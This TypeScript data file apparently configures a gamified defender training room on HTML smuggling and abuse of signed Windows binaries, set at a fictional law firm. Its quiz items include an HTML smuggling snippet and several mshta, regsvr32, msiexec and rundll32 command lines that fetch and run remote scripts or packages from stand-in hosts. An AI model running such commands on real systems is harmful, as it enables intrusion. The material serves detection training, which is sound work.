import type { RoomExperience } from "./types";

// "Operation Special Delivery" for the "html-smuggling-and-lolbins" room.
// Script: docs/campaign/54-html-smuggling-and-lolbins.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Marrow & Hale LLP (fictional), not the graded tasks' Thornfield Logistics records.
// Signature mechanic: intercept on live command lines, the same four binaries doing
// their real job or the attacker's.
// Game mix: codebreak + defuse + duel + intercept.
// Lab data differs from the graded tasks: no 198.51.100.77, 185.221.20.44, invoice_svc.sct,
// r.esposito, LT-THN-4471, CHG-88413, ccmexec or WarehouseScan. The chain order (o1), the
// everyday uses (m1) and the Zone.Identifier correlation (q4) are not played out here.
export const HTML_SMUGGLING_AND_LOLBINS: RoomExperience = {
  roomId: "html-smuggling-and-lolbins",
  codename: "Operation Special Delivery",
  theme: "smuggle",
  handler: { name: "Zanele Mokoena", role: "Detection Engineer, Marrow & Hale LLP" },
  briefing: [
    "Marrow & Hale LLP. 300 lawyers, 40,000 attachments a week, and a working day made of opening documents from strangers.",
    "The gateway scans every one of those attachments, and allowlisting stops anything unknown from running. On paper, nothing gets in.",
    "Zanele Mokoena's point is that the two best tricks of the last few years don't need to beat either control: one builds the file after the gateway, and the other runs it through a program you already trust.",
    "Learn how a file appears from nowhere, why a signed binary proves so little, and how to tell the same program doing two different jobs.",
  ],
  mission: "Win the duel against your own controls, find the payload hiding in a web page, crack the binaries' vocabulary, judge live command lines, then build a rule that survives its first week and work the graded cases.",
  estimate: "~95 min",
  look: { primary: "#fbbf24", secondary: "#38bdf8", warn: "#ef4444" },
  scene: "facilityhtmlsmugglingandlolbins",
  layout: "facility",
  story: {
    intro: { title: "40,000 Attachments", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/html-smuggling-and-lolbins/specialdelivery-intro-577bae52.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/html-smuggling-and-lolbins/specialdelivery-intro-2ed3884d.jpg" },
    afterStation: {
      attachment: { title: "Nothing Crossed the Wire", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/html-smuggling-and-lolbins/specialdelivery-ch2-4b14b92b.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/html-smuggling-and-lolbins/specialdelivery-ch2-927f7d21.jpg" },
      signed: { title: "Signed and Sealed", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/html-smuggling-and-lolbins/specialdelivery-ch3-ffe814b5.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/html-smuggling-and-lolbins/specialdelivery-ch3-191602c6.jpg" },
      doors: { title: "Same Program", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/html-smuggling-and-lolbins/specialdelivery-ch4-3959b63e.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/html-smuggling-and-lolbins/specialdelivery-ch4-a3f672f9.jpg" },
      rule: { title: "Special Delivery", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/html-smuggling-and-lolbins/specialdelivery-finale-63bc214b.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/html-smuggling-and-lolbins/specialdelivery-finale-c637bd18.jpg" },
    },
  },
  stations: [
    {
      id: "attachment",
      label: "The Attachment",
      topic: "What a LOLBin is · how HTML Smuggling builds a file past the gateway · two real campaigns",
      tagline: "Nothing file-shaped crossed the wire",
      building: "control",
      taskIds: ["hsl-r0", "hsl-r1", "hsl-r2", "hsl-r3", "hsl-q1"],
    },
    {
      id: "signed",
      label: "Signed and Sealed",
      topic: "The T1218 family · mshta · regsvr32 and Squiblydoo",
      tagline: "The name is fine. Read the arguments",
      building: "office",
      taskIds: ["hsl-r4", "hsl-r5", "hsl-r6", "hsl-q2"],
    },
    {
      id: "doors",
      label: "Two More Doors",
      topic: "rundll32 and msiexec · everyday use against abuse · the whole chain",
      tagline: "Same program, different job",
      building: "lab",
      taskIds: ["hsl-r7", "hsl-m1", "hsl-o1", "hsl-q3"],
    },
    {
      id: "telemetry",
      label: "What the Telemetry Shows",
      topic: "Parent process, command line, what happens next",
      tagline: "Three fields, one verdict",
      building: "vault",
      taskIds: ["hsl-r8", "hsl-la1", "hsl-f1"],
    },
    {
      id: "rule",
      label: "The Right Ten",
      topic: "Correlation logic and false-positive discipline",
      tagline: "Finish the story",
      building: "ticket",
      taskIds: ["hsl-r9", "hsl-ac1", "hsl-q4"],
      boss: true,
    },
  ],
  personas: {
    "hsl-q1": { name: "Zanele Mokoena", role: "Detection Engineer", line: "Two techniques, two layers. Say the difference in one breath." },
    "hsl-q2": { name: "Zanele Mokoena", role: "Detection Engineer", line: "One command line. What's it doing, and how do you know?" },
    "hsl-m1": { name: "Zanele Mokoena", role: "Detection Engineer", line: "Know what normal looks like, or nothing stands out." },
    "hsl-o1": { name: "Zanele Mokoena", role: "Detection Engineer", line: "Put it in the order it really happens." },
    "hsl-q3": { name: "Zanele Mokoena", role: "Detection Engineer", line: "Four installs. Three are ordinary." },
    "hsl-la1": { name: "Zanele Mokoena", role: "Detection Engineer", line: "Signed and valid. Now read the rest of it." },
    "hsl-f1": { name: "Zanele Mokoena", role: "Detection Engineer", line: "Same log. I want the file it asked for." },
    "hsl-ac1": { name: "Zanele Mokoena", role: "Detection Engineer", line: "It looks like the last one. Does it read like it?" },
    "hsl-q4": { name: "Zanele Mokoena", role: "Detection Engineer", line: "Tie the arrival to the execution. What do you pull?" },
  },
  briefings: {
    // ── Reading 0: why trusted binaries beat the controls ──
    "hsl-r0": [
      {
        kind: "duel",
        title: "Your Controls Against Theirs",
        prompt: "Zanele's board paper says Marrow & Hale's controls are strong. An attacker plays one move at a time, and every move comes through a signed Windows binary. Play the one card that really answers it. Most of your famous controls won't.",
        attacker: "An intruder with a foothold on one partner's laptop",
        moves: [
          { id: "m1", move: "Runs mshta.exe with a remote URL", detail: "The binary is Microsoft's, and it's on the allowlist.", counter: "cmd", hint: "The binary is fine. What in your logs would show what it was told to do?", why: "Allowlisting passes it because it IS the approved file. Only the full command line shows the URL it was told to fetch." },
          { id: "m2", move: "Drops a brand new unsigned loader.exe", detail: "An ordinary unknown program on disk.", counter: "allow", hint: "This one isn't a trusted binary. Which control was built for exactly that?", why: "Allowlisting is strong against this: unknown files don't run. That's why attackers stopped trying and moved to binaries already approved." },
          { id: "m3", move: "Replays a file seen in thousands of infections", detail: "The hash has been on every blocklist for a year.", counter: "av", hint: "It's the same bytes everyone already knows.", why: "Signature matching does what it was built for here. It fails on LOLBins because regsvr32.exe is byte-for-byte the same on every machine, so there's nothing new to fingerprint." },
          { id: "m4", move: "regsvr32.exe reaches out to an address nobody has seen", detail: "A trusted process, an untrusted destination.", counter: "egress", hint: "The process looks fine on the host. What's visible outside it?", why: "Network egress logs don't care how trusted the process is. A new outbound destination from that host right after launch is a signal in its own right." },
        ],
        cards: [
          { id: "allow", name: "Application allowlisting", effect: "Only approved binaries may run" },
          { id: "av", name: "Signature antivirus", effect: "Matches files against known-bad hashes" },
          { id: "cmd", name: "Command-line auditing", effect: "Records the full arguments of every process" },
          { id: "egress", name: "Egress logging", effect: "Records outbound connections per host" },
          { id: "sign", name: "Signature check", effect: "Confirms a file is vendor-signed and unaltered" },
          { id: "motw", name: "SmartScreen", effect: "Warns on files downloaded from the internet" },
        ],
        lesson: "Allowlisting and signatures judge the file, and a LOLBin is a perfectly good file. What differs is what it was told to do, so the evidence is in the command line and in what happens next.",
      },
    ],
    // ── Reading 1: what's inside the page ──
    "hsl-r1": [
      {
        kind: "hotspot",
        title: "Find the Payload",
        prompt: "The gateway passed this 'court bundle' attachment as a harmless web page, and it wasn't wrong about the file type. Open it the way the browser will. Click each part that helps turn this page into a file on disk.",
        artifact: "court-bundle-1147.html (view source)",
        parts: [
          { id: "title", text: "<title>Secure Document Viewer</title>", flag: false, note: "Decoration. Any page can claim to be secure, and the gateway doesn't care.", style: "meta" },
          { id: "logo", text: "<img src=\"data:image/png;base64,iVBORw0KGgo...\" alt=\"Firm logo\">", flag: false, note: "A small image embedded as a Data URL. Lots of normal pages do this, and on its own it builds nothing.", style: "body" },
          { id: "text", text: "<p>Your document is being prepared. Please wait.</p>", flag: false, note: "Just something to read while the script runs.", style: "body" },
          { id: "blob64", text: "var d = \"UEsDBBQAAAAIAH1s...\" /* 2.1 MB of text */", flag: true, note: "The whole payload, written as text inside the page. On the wire it's only characters in an HTML document, so no file signature ever crosses the gateway.", style: "body" },
          { id: "dec", text: "var b = Uint8Array.from(atob(d), c => c.charCodeAt(0));", flag: true, note: "Decoding happens here, on the victim's machine, after every network control has already been passed.", style: "body" },
          { id: "mk", text: "var f = new Blob([b], { type: \"application/octet-stream\" });", flag: true, note: "A Blob: raw file-like bytes held in the browser's memory. This is the moment text becomes a file in all but name.", style: "body" },
          { id: "a", text: "a.href = URL.createObjectURL(f); a.download = \"bundle.iso\";", flag: true, note: "The download attribute tells the browser to save those bytes as a named file.", style: "body" },
          { id: "click", text: "a.click();", flag: true, note: "A synthetic click. The user only opened a page, and now an ISO is in Downloads.", style: "body" },
          { id: "css", text: "<style>body { font-family: Arial; }</style>", flag: false, note: "Plain styling.", style: "body" },
        ],
      },
    ],
    // ── Reading 3: two campaigns, one technique ──
    "hsl-r3": [
      {
        kind: "lineup",
        title: "Whose Tradecraft Is This?",
        prompt: "Zanele pins three old incident summaries to the wall and takes the names off. Match each set of facts to who ran it. Notice how little of it is about the tool.",
        suspects: [
          { id: "nob", name: "NOBELIUM (APT29)", motive: "Espionage", skill: "Trusted infrastructure, in-memory stages", target: "Government, think tanks, NGOs" },
          { id: "qak", name: "QakBot", motive: "Financial, high volume", skill: "Changes delivery as defences change", target: "Anyone with a mailbox" },
          { id: "fin", name: "FIN7", motive: "Financial", skill: "VBScript through mshta.exe", target: "Retail and point-of-sale" },
        ],
        rounds: [
          { id: "r1", evidence: ["Mail really sent through a compromised marketing account", "An HTML file writes an ISO to disk", "Later stage reloads shellcode, about once an hour, never as a file"], suspect: "nob", why: "Real trusted infrastructure, then a chain ending in memory. EnvyScout was the HTML stage, and the XOR and Base64 were only there so it didn't look like an ISO in transit." },
          { id: "r2", evidence: ["ISO attachments stopped working as well as they had", "Now an HTML file builds a ZIP that needs a password", "The password is in the email, for the human"], suspect: "qak", why: "A password no scanner has, on a file no gateway saw. QakBot adopted this in June 2022 after internet macros were blocked by default: a commodity family reaching for the same mechanism." },
          { id: "r3", evidence: ["Tills across a retail chain", "mshta.exe runs VBScript to deploy code"], suspect: "fin", why: "Same trusted binary as plenty of other groups. That's the point: the binary tells you the technique, not the actor." },
        ],
      },
    ],
    // ── Reading 4: the vocabulary ──
    "hsl-r4": [
      {
        kind: "codebreak",
        title: "Crack the Family",
        prompt: "Zanele's queue speaks in codes. Each clue describes one. Crack it before you read a single command line.",
        tries: 5,
        rounds: [
          { id: "t", clue: "The ATT&CK ID for the whole System Binary Proxy Execution family", answer: "T1218", why: "One parent technique with fourteen sub-techniques, one per binary." },
          { id: "ta", clue: "The tactic ID for Stealth, the same ID it had when it was called Defense Evasion", answer: "TA0005", why: "The name changed in v19, and the ID didn't. Anchor on the ID in older reports." },
          { id: "b", clue: "Microsoft's build engine, which can compile inline C# from a project file", answer: "MSBuild", why: "Part of the sibling family T1127, Trusted Developer Utilities, which is tagged both Execution and Stealth." },
          { id: "tx", clue: "The ATT&CK ID for pulling a follow-on file onto a host", answer: "T1105", why: "Ingress Tool Transfer. It's tagged as well when a LOLBin is used purely as a downloader." },
        ],
        lesson: "Every member of the family has the same shape: a signed everyday utility takes an argument, and the argument can point at the attacker's logic. Learn the shape and the IDs fall into place.",
      },
    ],
    // ── Reading 7: same four binaries, read live ──
    "hsl-r7": [
      {
        kind: "intercept",
        title: "Hold the Command Line",
        prompt: "Monday morning at Marrow & Hale, and the four binaries are running everywhere. Zanele puts you on the live feed. Each command line is the same program, doing its real job or someone else's. Block the abuse, and remember that blocking a real install stops the firm working.",
        protect: "the fee-earners' laptops",
        blockLabel: "Block",
        passLabel: "Let run",
        seconds: 13,
        items: [
          { id: "printui", text: "rundll32.exe printui.dll,PrintUIEntry /il", sub: "parent: explorer.exe", bad: false, why: "A real export of a real system DLL: the printer dialog, opened from the desktop." },
          { id: "temp", text: "rundll32.exe C:\\Users\\k.adeyemi\\AppData\\Local\\Temp\\ms4f.dat,Start", sub: "parent: wscript.exe", bad: true, why: "A DLL with a .dat name in Temp, launched by a script. Nothing installed lives there. This is the loader shape." },
          { id: "smb", text: "rundll32.exe \\\\203.0.113.61\\pub\\d3d.dll,Run", sub: "parent: cmd.exe", bad: true, why: "A DLL run straight from a remote share outside the firm, never copied to disk." },
          { id: "msi", text: "msiexec.exe /i \"C:\\Program Files\\Hale\\Clio\\clio-update.msi\" /qn", sub: "parent: svc-deploy agent", bad: false, why: "A local package under a known application, started by the firm's deployment agent. Silent install is normal for that." },
          { id: "msiweb", text: "msiexec.exe /q /i http://203.0.113.61/teams_patch.msi", sub: "parent: outlook.exe", bad: true, why: "Mail client launching a silent install from a bare IP. The name says Teams, and the source says otherwise." },
          { id: "hta", text: "mshta.exe C:\\Tools\\HelpDesk\\kiosk.hta", sub: "parent: explorer.exe", bad: false, why: "A local .hta in the help desk's own folder. Old-fashioned, and fine." },
          { id: "script", text: "mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:https://cdn-law.example/a.sct\"\")\"))", sub: "parent: winword.exe", bad: true, why: "A script protocol, a remote scriptlet, and Word as the parent: three tells in one line." },
          { id: "reg", text: "regsvr32.exe /s \"C:\\Program Files\\iManage\\FileSite\\ifs.dll\"", sub: "parent: msiexec.exe", bad: false, why: "An installer registering the DLL it just placed. That's what regsvr32 is for." },
          { id: "reg2", text: "regsvr32.exe /s /u /i:https://cdn-law.example/w.sct scrobj.dll", sub: "parent: cmd.exe", bad: true, why: "/i: with a URL and scrobj.dll: no DLL of its own, nothing to register. That's Squiblydoo." },
          { id: "ctl", text: "rundll32.exe shell32.dll,Control_RunDLL desk.cpl", sub: "parent: explorer.exe", bad: false, why: "It looks arcane, but it's only the Display settings panel." },
        ],
        lesson: "The binary name never decides it. Read where the code comes from (a local path or a URL), what launched it (an installer or an Office app), and whether the DLL lives where software lives.",
      },
    ],
    // ── Reading 9: the rule that survives ──
    "hsl-r9": [
      {
        kind: "defuse",
        title: "Fix the Rule Before It's Switched Off",
        prompt: "Zanele's new LOLBin rule went live on Friday. By Monday the team wants it disabled. Each module is a problem in the rule. Cut the one change that fixes it before the team loses patience.",
        device: "Rule: LOLBin proxy execution",
        seconds: 75,
        rounds: [
          {
            id: "one",
            state: "Rule fires on every rundll32.exe, regsvr32.exe and mshta.exe. Friday: 41,000 alerts.",
            wires: [
              { id: "a", label: "Raise severity so people look" },
              { id: "b", label: "Require a command-line indicator such as a URL or script prefix" },
              { id: "c", label: "Remove rundll32.exe from the list" },
            ],
            cut: "b",
            hint: "The binaries run all day. What separates the abuse from the routine?",
            why: "The binary's presence means nothing. Adding a command-line condition keeps every binary in scope and only fires on the abuse shape. Dropping rundll32 would lose one of the most abused of the four.",
          },
          {
            id: "two",
            state: "Now 300 alerts a day. Nearly all of them are installers registering DLLs from a folder called HTTPModule.",
            wires: [
              { id: "a", label: "Exclude installer parents such as msiexec.exe and TrustedInstaller.exe" },
              { id: "b", label: "Exclude every DLL with http in its path" },
              { id: "c", label: "Only run the rule at weekends" },
            ],
            cut: "a",
            hint: "A path can be chosen by an attacker. What else tells you it's an install?",
            why: "A parent exclusion removes the routine case. Excluding paths with http would hand attackers a free pass: they only need to name a folder that way.",
          },
          {
            id: "three",
            state: "Alerts are down to about ten a year, and good. One analyst wants to close them all on sight because the image is signed by Microsoft.",
            wires: [
              { id: "a", label: "Add a clause dropping validly signed images" },
              { id: "b", label: "Auto-close anything with a Valid signature" },
              { id: "c", label: "Keep the rule as it is: the signature says nothing about the arguments" },
            ],
            cut: "c",
            hint: "Which of these four binaries isn't validly signed?",
            why: "All four are always validly signed. A signature clause would quietly turn the whole rule off.",
          },
        ],
        lesson: "A rule that survives has three parts: the binaries, a command-line indicator, and an exclusion for the routine parents. Each part removes a different kind of noise, and none of them weakens what you came to catch.",
      },
    ],
  },
};
